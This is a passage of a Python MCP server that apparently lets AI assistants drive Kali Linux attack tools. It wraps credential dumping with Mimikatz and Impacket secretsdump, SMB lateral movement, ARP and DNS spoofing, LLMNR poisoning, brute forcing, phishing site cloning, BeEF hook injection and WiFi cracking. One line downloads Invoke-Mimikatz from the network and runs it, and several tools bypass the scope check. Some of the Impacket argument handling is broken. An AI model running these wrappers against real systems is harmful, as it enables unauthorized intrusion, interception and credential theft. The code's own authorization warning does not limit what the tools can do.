        if args.get("username"):
            cmd += ["-u", args["username"]]
        if args.get("password"):
            cmd += ["-p", args["password"]]
        if args.get("hash"):
            cmd += ["-H", args["hash"]]
        if args.get("module"):
            cmd += ["-M", args["module"]]
        if args.get("command"):
            cmd += ["-x", args["command"]]
        if args.get("exec_method"):
            cmd += ["--exec-method", args["exec_method"]]
        if args.get("port"):
            cmd += ["--port", str(args["port"])]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("crackmapexec"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_impacket_scripts(self, args: dict) -> dict:
        """Ejecutar scripts de Impacket"""
        script = args["script"]
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)
        
        # Construir comando base
        if script in ["psexec.py", "wmiexec.py", "smbexec.py"]:
            if args.get("hash"):
                auth = f"-hashes {args['hash']}"
            else:
                auth = f"{args['username']}:{args['password']}" if args.get("password") else args['username']
            cmd = [script, f"{args.get('domain', '')}/{auth}@{target}"]
            
            if args.get("command"):
                cmd.append(args["command"])
        
        elif script == "secretsdump.py":
            if args.get("hash"):
                auth = f"-hashes {args['hash']}"
            else:
                auth = f"{args['username']}:{args['password']}" if args.get("password") else args['username']
            cmd = [script, f"{args.get('domain', '')}/{auth}@{target}"]
        
        elif script in ["GetUserSPNs.py", "GetNPUsers.py"]:
            cmd = [script, f"{args.get('domain', '')}/{args['username']}:{args['password']}"]
            if args.get("target"):
                cmd += ["-dc-ip", target]
        
        if args.get("port"):
            cmd += ["-port", str(args["port"])]
        if args.get("extra_args"):
            cmd += shlex.split(args["extra_args"])
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("impacket"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_bloodhound_enum(self, args: dict) -> dict:
        """Enumeración con BloodHound"""
        target = args["target"]
        username = args["username"]
        password = args["password"]
        domain = args["domain"]
        collector = args.get("collector", "BloodHound.py")
        
        if collector == "BloodHound.py":
            cmd = ["bloodhound-python", "-u", username, "-p", password, "-d", domain, "-dc", target]
            if args.get("collection_methods"):
                methods = ",".join(args["collection_methods"])
                cmd += ["-c", methods]
            if args.get("zip_filename"):
                cmd += ["--zip", args["zip_filename"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, 300)
        return self._ok(stdout if stdout else stderr)

    async def _tool_mimikatz(self, args: dict) -> dict:
        """Ejecutar comandos de Mimikatz"""
        command = args["command"]
        
        if args.get("method") == "local":
            # Crear script temporal para Mimikatz
            script_content = f"{command}\nexit\n"
            script_file = f"/tmp/mimikatz_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(script_file, "w") as f:
                f.write(script_content)
            
            cmd = ["mimikatz", script_file]
            stdout, stderr, rc = await self._run_subprocess(cmd, 60)
            return self._ok(stdout if stdout else stderr)
        
        elif args.get("method") == "powershell":
            # Ejecutar via PowerShell (invoke-mimikatz)
            ps_command = f"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '{command}'"
            cmd = ["powershell", "-Command", ps_command]
            stdout, stderr, rc = await self._run_subprocess(cmd, 60)
            return self._ok(stdout if stdout else stderr)
        
        return self._error("Método de ejecución no soportado")

    async def _tool_wpscan(self, args: dict) -> dict:
        """Escáner de WordPress"""
        url = InputSanitizer.sanitize_url(args["target_url"])
        
        cmd = ["wpscan", "--url", url, "--no-banner", "--format", "json"]
        
        if args.get("enumerate"):
            enumerate_str = ",".join(args["enumerate"])
            cmd += ["--enumerate", enumerate_str]
        if args.get("username") and args.get("password_list"):
            cmd += ["--usernames", args["username"], "--passwords", args["password_list"]]
        if args.get("api_token"):
            cmd += ["--api-token", args["api_token"]]
        if args.get("random_agent"):
            cmd += ["--random-user-agent"]
        if args.get("stealthy"):
            cmd += ["--stealthy"]
        if args.get("proxy"):
            cmd += ["--proxy", args["proxy"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("wpscan"))
        
        # Intentar parsear JSON
        try:
            data = json.loads(stdout)
            return self._ok(json.dumps(data, indent=2))
        except json.JSONDecodeError:
            return self._ok(stdout if stdout else stderr)

    async def _tool_joomscan(self, args: dict) -> dict:
        """Escáner de Joomla"""
        url = InputSanitizer.sanitize_url(args["target_url"])
        
        cmd = ["joomscan", "--url", url]
        
        if args.get("enumerate"):
            cmd += ["--enumerate", args["enumerate"]]
        if args.get("cookie"):
            cmd += ["--cookie", args["cookie"]]
        if args.get("user_agent"):
            cmd += ["--user-agent", args["user_agent"]]
        if args.get("proxy"):
            cmd += ["--proxy", args["proxy"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("joomscan"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_zap_scan(self, args: dict) -> dict:
        """Escaneo con OWASP ZAP"""
        url = InputSanitizer.sanitize_url(args["target_url"])
        scan_type = args.get("scan_type", "full")
        
        # Asumimos que ZAP está corriendo en modo daemon
        zap_api = f"http://localhost:{args.get('port', 8080)}"
        
        import aiohttp
        
        async with aiohttp.ClientSession() as session:
            if scan_type in ["spider", "full"]:
                # Iniciar spider
                spider_url = f"{zap_api}/JSON/spider/action/scan/"
                params = {"url": url, "apikey": args.get("api_key", "")}
                if args.get("max_children"):
                    params["maxChildren"] = args["max_children"]
                
                async with session.get(spider_url, params=params) as resp:
                    spider_data = await resp.json()
            
            if scan_type in ["active", "full"]:
                # Iniciar escaneo activo
                active_url = f"{zap_api}/JSON/ascanner/action/scan/"
                params = {"url": url, "apikey": args.get("api_key", "")}
                if args.get("context_name"):
                    params["contextName"] = args["context_name"]
                
                async with session.get(active_url, params=params) as resp:
                    active_data = await resp.json()
            
            # Obtener resultados
            results_url = f"{zap_api}/JSON/core/view/alerts/"
            params = {"baseurl": url, "apikey": args.get("api_key", "")}
            async with session.get(results_url, params=params) as resp:
                alerts = await resp.json()
        
        return self._ok(json.dumps(alerts, indent=2))

    async def _tool_bettercap_scan(self, args: dict) -> dict:
        """BetterCAP para MITM"""
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)
        
        cmd = ["bettercap", "-eval"]
        
        # Construir comandos de BetterCAP
        commands = []
        
        if args.get("interface"):
            commands.append(f"set net.interface {args['interface']}")
        
        if args.get("gateway"):
            commands.append(f"set arp.spoof.targets {target}")
            commands.append(f"set arp.spoof.gateway {args['gateway']}")
            commands.append("arp.spoof on")
        
        if args.get("module") == "net.sniff":
            commands.append(f"set net.sniff.target {target}")
            commands.append("net.sniff on")
        elif args.get("module") == "dns.spoof":
            commands.append("dns.spoof on")
        
        if args.get("commands"):
            commands.extend(args["commands"])
        
        # Unir comandos con ;
        eval_cmd = "; ".join(commands)
        cmd.append(eval_cmd)
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("bettercap"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_responder_poison(self, args: dict) -> dict:
        """Responder para envenenamiento LLMNR/NBT-NS"""
        interface = args.get("interface", "eth0")
        mode = args.get("mode", "poison")
        
        cmd = ["responder", "-I", interface]
        
        if mode == "analyze":
            cmd.append("-A")
        
        if args.get("services"):
            for service in args["services"]:
                if service == "HTTP":
                    cmd.append("-w")
                elif service == "SMB":
                    cmd.append("--smb")
                elif service == "SQL":
                    cmd.append("--sql")
                elif service == "FTP":
                    cmd.append("--ftp")
        
        if args.get("wpad"):
            cmd.append("-F")
        if args.get("fingerprint"):
            cmd.append("-f")
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("responder"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_medusa_bruteforce(self, args: dict) -> dict:
        """Ataque de fuerza bruta con Medusa"""
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)
        
        service = args["service"]
        password_list = InputSanitizer.sanitize_path(args["password_list"])
        
        cmd = ["medusa", "-h", target, "-U", args.get("user_list", ""), 
               "-P", password_list, "-M", service]
        
        if args.get("username"):
            cmd += ["-u", args["username"]]
        if args.get("port"):
            cmd += ["-n", str(args["port"])]
        if args.get("threads"):
            cmd += ["-t", str(args["threads"])]
        if args.get("timeout"):
            cmd += ["-T", str(args["timeout"])]
        if args.get("verbose"):
            cmd.append("-v")
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("medusa"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_ncrack_bruteforce(self, args: dict) -> dict:
        """Ataque de fuerza bruta con Ncrack"""
        target = args["target"]  # formato: ip:puerto
        service = args["service"]
        
        cmd = ["ncrack", "-U", args["user_list"], "-P", args["pass_list"], 
               f"{service}://{target}"]
        
        if args.get("timing"):
            cmd += ["-T", args["timing"]]
        if args.get("connections"):
            cmd += ["-c", str(args["connections"])]
        if args.get("save"):
            cmd += ["-oN", args["save"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("ncrack"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_setoolkit(self, args: dict) -> dict:
        """Social Engineering Toolkit"""
        attack_vector = args["attack_vector"]
        
        # Crear config temporal para SET
        config_file = f"/tmp/set_config_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        with open(config_file, "w") as f:
            f.write(f"{attack_vector}\n")  # Attack vector
            if attack_vector == 2 and args.get("web_attack_type"):  # Web attack
                f.write(f"{args['web_attack_type']}\n")
                if args.get("clone_url"):
                    f.write("2\n")  # Site cloner
                    f.write(f"{args['clone_url']}\n")
            if args.get("payload"):
                f.write(f"{args['payload']}\n")
            if args.get("lhost"):
                f.write(f"{args['lhost']}\n")
            if args.get("lport"):
                f.write(f"{args['lport']}\n")
        
        cmd = ["setoolkit", "-c", config_file]
        stdout, stderr, rc = await self._run_subprocess(cmd, 300)
        return self._ok(stdout if stdout else stderr)

    async def _tool_beef_start(self, args: dict) -> dict:
        """Controlar BeEF framework"""
        action = args.get("action", "start")
        
        if action == "start":
            cmd = ["beef-xss", "--no-browser"]
            if args.get("port"):
                # Modificar config de BeEF para cambiar puerto
                pass
            stdout, stderr, rc = await self._run_subprocess(cmd, 30)
            return self._ok("BeEF iniciado en http://localhost:3000/ui/panel")
        
        elif action == "hook":
            if not args.get("target_url"):
                return self._error("target_url requerido para hook")
            hook_url = f"<script src='http://localhost:3000/hook.js'></script>"
            return self._ok(f"Inyecta este script en {args['target_url']}:\n{hook_url}")
        
        return self._ok("Comando no implementado")

    async def _tool_tcpdump_capture(self, args: dict) -> dict:
        """Capturar tráfico con tcpdump"""
        interface = args["interface"]
        
        cmd = ["tcpdump", "-i", interface, "-c", str(args.get("count", 100))]
        
        if args.get("filter"):
            cmd += [args["filter"]]
        if args.get("output_file"):
            cmd += ["-w", args["output_file"]]
        if args.get("verbose"):
            cmd += ["-v"]
        if args.get("duration"):
            cmd += ["-G", str(args["duration"]), "-W", "1"]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("tcpdump"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_ettercap_mitm(self, args: dict) -> dict:
        """Ataques MITM con Ettercap"""
        target1 = InputSanitizer.sanitize_target(args["target1"])
        target2 = InputSanitizer.sanitize_target(args["target2"])
        self._scope_check(target1)
        self._scope_check(target2)
        
        interface = args.get("interface", "eth0")
        attack_type = args.get("attack_type", "arp")
        
        # Crear target file
        targets = f"{target1} {target2}"
        target_file = f"/tmp/ettercap_targets_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        with open(target_file, "w") as f:
            f.write(targets)
        
        cmd = ["ettercap", "-T", "-i", interface, "-j", target_file, "-M", attack_type]
        
        if args.get("filters"):
            for filter_file in args["filters"]:
                cmd += ["-F", filter_file]
        if args.get("plugins"):
            cmd += ["-P", ",".join(args["plugins"])]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("ettercap"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_aircrack_suite(self, args: dict) -> dict:
        """Suite Aircrack-ng"""
        command = args["command"]
        cmd = []
        
        if command == "airmon":
            cmd = ["airmon-ng"]
            if args.get("interface"):
                cmd += ["start", args["interface"]]
        
        elif command == "airodump":
            cmd = ["airodump-ng"]
            if args.get("interface"):
                cmd += [args["interface"]]
            if args.get("bssid"):
                cmd += ["--bssid", args["bssid"]]
            if args.get("channel"):
                cmd += ["--channel", str(args["channel"])]
            if args.get("output_prefix"):
                cmd += ["-w", args["output_prefix"]]
        
        elif command == "aireplay":
            if not args.get("attack_type"):
                return self._error("attack_type requerido para aireplay")
            cmd = ["aireplay-ng", f"--{args['attack_type']}"]
            if args.get("bssid"):
                cmd += ["-a", args["bssid"]]
            if args.get("client"):
                cmd += ["-c", args["client"]]
            if args.get("interface"):
                cmd.append(args["interface"])
        
        elif command == "aircrack":
            if not args.get("capture_file"):
                return self._error("capture_file requerido para aircrack")
            cmd = ["aircrack-ng", args["capture_file"]]
            if args.get("wordlist"):
                cmd += ["-w", args["wordlist"]]
            if args.get("bssid"):
                cmd += ["--bssid", args["bssid"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("aircrack"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_wifite_audit(self, args: dict) -> dict:
        """Auditoría WiFi con Wifite"""
        interface = args.get("interface", "wlan0")
        
        cmd = ["wifite", "-i", interface, "--kill"]
        
        if args.get("target_bssid"):
            cmd += ["--target", args["target_bssid"]]
        if args.get("target_channel"):
            cmd += ["--channel", str(args["target_channel"])]
        if args.get("attack"):
            cmd += ["--attack", args["attack"]]
        if args.get("wordlist"):
            cmd += ["--dict", args["wordlist"]]
        if args.get("wps_pin"):
            cmd += ["--wps"]
        if args.get("no_wps"):
            cmd += ["--no-wps"]
        if args.get("power"):
            cmd += ["--power", str(args["power"])]
        if args.get("clients"):
            cmd += ["--clients-only"]
        if args.get("wep_attack"):
            cmd += ["--wep", args["wep_attack"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("wifite"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_crunch_gen(self, args: dict) -> dict:
        """Generar wordlists con Crunch"""
        min_len = args["min_length"]
        max_len = args["max_length"]
        
        cmd = ["crunch", str(min_len), str(max_len)]
        
        if args.get("charset"):
            cmd += [args["charset"]]
        if args.get("pattern"):
            cmd += ["-t", args["pattern"]]
        if args.get("output_file"):
            cmd += ["-o", args["output_file"]]
        if args.get("start_string"):
            cmd += ["-s", args["start_string"]]
        if args.get("stop_string"):
            cmd += ["-e", args["stop_string"]]
        if args.get("compress"):
            cmd += ["-z", "gzip"]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("crunch"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_cewl_gen(self, args: dict) -> dict:
        """Generar wordlists con CeWL"""
        url = InputSanitizer.sanitize_url(args["target_url"])
        
        cmd = ["cewl", url]
        
        if args.get("depth"):
            cmd += ["-d", str(args["depth"])]
        if args.get("min_word_length"):
            cmd += ["-m", str(args["min_word_length"])]
        if args.get("max_word_length"):
            cmd += ["-x", str(args["max_word_length"])]
        if args.get("output_file"):
            cmd += ["-w", args["output_file"]]
        if args.get("with_numbers"):
            cmd += ["--with-numbers"]
        if args.get("email_addresses"):
            cmd += ["-e"]
        if args.get("meta_data"):
            cmd += ["--meta"]
        if args.get("user_agent"):
            cmd += ["-u", args["user_agent"]]
        if args.get("proxy"):
            cmd += ["--proxy", args["proxy"]]
        
        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("cewl"))
        return self._ok(stdout if stdout else stderr)


# ---------------------------------------------------------------------------
# LM Studio helper
# ---------------------------------------------------------------------------

class LMStudioClient:
    """Minimal helper for interacting with LM Studio's OpenAI-compatible API."""

    def __init__(self, config: dict) -> None:
        lm_cfg = config.get("lmstudio", {})
        self.base_url: str = lm_cfg.get("base_url", "http://localhost:1234/v1")
        self.model: str = lm_cfg.get("model", "local-model")
        self.timeout: int = lm_cfg.get("timeout", 120)

    async def chat_completion(self, messages: list[dict], temperature: float = 0.7) -> str:
        """Send a chat completion request and return the assistant message text."""
        try:
            import aiohttp
        except ImportError:
            return "aiohttp is not installed – cannot reach LM Studio."

        payload = {
            "model": self.model,
            "messages": messages,
            "temperature": temperature,
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}/chat/completions",
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                ) as resp:
                    data = await resp.json()
                    return data["choices"][0]["message"]["content"]
        except Exception as exc:
            return f"LM Studio request failed: {exc}"


# ---------------------------------------------------------------------------
# MCP Server – JSON-RPC over stdio
# ---------------------------------------------------------------------------

class MCPServer:
    """
    Model Context Protocol server that exposes Kali Linux tools over JSON-RPC
    via stdin/stdout for consumption by AI assistants (e.g. LM Studio).
    """

    PROTOCOL_VERSION = "2024-11-05"
    SERVER_NAME = "rami-kali"
    SERVER_VERSION = "3.3"

    def __init__(self) -> None:
        self._config = load_config()
        self._logger = setup_logging(self._config)
        self._audit = AuditLogger(
            self._config.get("security", {}).get("audit_log", "audit.log")
        )

        # [MEJORA 4] Check which binaries are available
        self._available_binaries = check_available_binaries(self._logger)

        # [MEJORA 6] Initialize scan database
        db_path = self._config.get("server", {}).get("database", "scan_results.db")
        self._scan_db = ScanDatabase(db_path)

        self._registry = ToolRegistry(self._available_binaries)
        self._executor = ToolExecutor(self._config, self._logger, self._audit, self._scan_db)
        self._evidence_validator = EvidenceValidator()
        self._knowledge = KnowledgeLoader(self._logger)
        self._lm_client = LMStudioClient(self._config)

        srv = self._config.get("server", {})
        self.SERVER_NAME = srv.get("name", self.SERVER_NAME)
        self.SERVER_VERSION = srv.get("version", self.SERVER_VERSION)

        available_count = sum(1 for v in self._available_binaries.values() if v)
        total_count = len(self._available_binaries)

        self._logger.info(
            "MCP Server initialized: %s v%s (%d/%d tools available)",
            self.SERVER_NAME, self.SERVER_VERSION, available_count, total_count,
        )

    async def handle_message(self, message: dict) -> Optional[dict]:
        """Route an incoming JSON-RPC message and return the response."""
        method = message.get("method", "")
        msg_id = message.get("id")
        params = message.get("params", {})

        self._logger.debug("Received method=%s id=%s", method, msg_id)

        if msg_id is None:
            if method == "notifications/initialized":
                self._logger.info("Client initialized notification received.")
            return None

        try:
            if method == "initialize":
                result = self._handle_initialize(params)
            elif method == "tools/list":
                result = self._handle_tools_list()
            elif method == "tools/call":
                result = await self._handle_tools_call(params)
            else:
                return self._jsonrpc_error(msg_id, -32601, f"Method not found: {method}")
        except Exception as exc:
            self._logger.exception("Internal error handling %s", method)
            return self._jsonrpc_error(msg_id, -32603, f"Internal error: {exc}")

        return {"jsonrpc": "2.0", "id": msg_id, "result": result}

    def _handle_initialize(self, params: dict) -> dict:
        self._logger.info(
            "Initialize request from client: %s",
            params.get("clientInfo", {}).get("name", "unknown"),
        )
        return {
            "protocolVersion": self.PROTOCOL_VERSION,
            "capabilities": {
                "tools": {"listChanged": False},
            },
            "serverInfo": {
                "name": self.SERVER_NAME,
                "version": self.SERVER_VERSION,
            },
        }

    def _handle_tools_list(self) -> dict:
        return {"tools": self._registry.tools}

    async def _handle_tools_call(self, params: dict) -> dict:
        tool_name = params.get("name", "")
        arguments = params.get("arguments", {})

        if not self._registry.get(tool_name):
            return {
                "content": [{"type": "text", "text": f"Unknown tool: {tool_name}"}],
                "isError": True,
            }

        self._logger.info("Calling tool: %s with args: %s", tool_name, json.dumps(arguments)[:200])

        # Collect artifact paths from arguments (tools that write output files)
        artifact_paths: list[str] = []
        for key in ("output_file", "output_prefix", "output"):
            if key in arguments and isinstance(arguments[key], str):
                artifact_paths.append(arguments[key])

        result = await self._executor.execute(tool_name, arguments)

        # === EVIDENCE GATE ===
        verdict = self._evidence_validator.validate(
            tool_name, result, artifact_paths=artifact_paths or None,
        )

        # Persist verdict (linked to the most recent scan_id for this tool)
        try:
            last_scan = self._scan_db.get_history(tool=tool_name, limit=1)
            scan_id = last_scan[0]["id"] if last_scan else None
        except Exception:
            scan_id = None
        self._scan_db.save_verdict(tool_name, verdict, scan_id=scan_id)

        # Prepend the machine-readable evidence header
        if result.get("content"):
            result["content"].insert(0, {
                "type": "text",
                "text": verdict.to_header(),
            })

        # Only inject tactical knowledge if there are actual findings
        if not verdict.no_findings and not result.get("isError", False) and result.get("content"):
            # Raw tool output is the last content block
            tool_output = result["content"][-1].get("text", "")
            tactical_ctx = self._knowledge.get_context(tool_name, scan_results=tool_output)
            if tactical_ctx:
                # Insert knowledge AFTER the evidence gate, BEFORE raw output
                result["content"].insert(1, {
                    "type": "text",
                    "text": tactical_ctx,
                })

        return result

    @staticmethod
    def _jsonrpc_error(msg_id: Any, code: int, message: str) -> dict:
        return {
            "jsonrpc": "2.0",
            "id": msg_id,
            "error": {"code": code, "message": message},
        }

    async def run(self) -> None:
        """Read JSON-RPC messages from stdin line by line, process, and write responses to stdout."""
        self._logger.info("MCP Server starting – reading from stdin...")

        reader = asyncio.StreamReader()
        protocol = asyncio.StreamReaderProtocol(reader)
        await asyncio.get_event_loop().connect_read_pipe(lambda: protocol, sys.stdin.buffer)

        w_transport, w_protocol = await asyncio.get_event_loop().connect_write_pipe(
            asyncio.streams.FlowControlMixin, sys.stdout.buffer
        )
        writer = asyncio.StreamWriter(w_transport, w_protocol, reader, asyncio.get_event_loop())

        while True:
            try:
                line = await reader.readline()
                if not line:
                    self._logger.info("stdin closed – shutting down.")
                    break

                line_str = line.decode("utf-8", errors="replace").strip()
                if not line_str:
                    continue

                try:
                    message = json.loads(line_str)
                except json.JSONDecodeError as exc:
                    self._logger.warning("Invalid JSON: %s", exc)
                    err = self._jsonrpc_error(None, -32700, f"Parse error: {exc}")
                    writer.write((json.dumps(err) + "\n").encode("utf-8"))
                    await writer.drain()
                    continue

                response = await self.handle_message(message)
                if response is not None:
                    out = json.dumps(response) + "\n"
                    writer.write(out.encode("utf-8"))
                    await writer.drain()

            except asyncio.CancelledError:
                self._logger.info("Server cancelled.")
                break
            except Exception as exc:
                self._logger.exception("Unexpected error in main loop: %s", exc)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """Start the MCP server."""
    print(
        "Red Team MCP Server v2.0 – For AUTHORIZED penetration testing only.\n"
        "Ensure you have written permission before testing any target.\n"
        "\n"
        "Improvements in v2.0:\n"
        "  - DNS hostname resolution in scope check\n"
        "  - Risk-based warnings for destructive tools\n"
        "  - Structured output parsers (nmap, nikto, gobuster, hydra, whatweb)\n"
        "  - Binary availability check (only lists installed tools)\n"
        "  - Rate limiting (global + per-tool semaphores)\n"
        "  - SQLite scan history database\n"
        "  - auto_recon workflow tool\n"
        "  - generate_report tool\n"
        "  - Added 30+ penetration testing tools (Metasploit, BetterCAP, Impacket, etc.)\n",
        file=sys.stderr,
    )

    server = MCPServer()

    if sys.platform != "win32":
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, loop.stop)
        try:
            loop.run_until_complete(server.run())
        finally:
            loop.close()
    else:
        asyncio.run(server.run())


if __name__ == "__main__":
    main()
